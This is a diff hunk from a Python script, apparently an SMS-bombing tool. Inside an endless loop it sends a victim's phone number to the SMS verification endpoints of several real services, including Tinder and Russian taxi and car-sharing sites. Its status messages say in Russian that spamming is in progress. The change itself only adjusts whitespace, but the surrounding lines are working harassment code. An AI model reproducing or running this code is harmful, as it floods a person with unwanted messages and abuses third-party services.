@@ -39,7 +39,7 @@ while True:
 	requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
 	print('\033[FИдет процесс спама /           ')
 	requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
-	print('\033[FИдет процесс спама ——           ')
+	print('\033[FИдет процесс спама ——          ')
 	requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
 	print('\033[FИдет процесс спама \           ')
 	requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
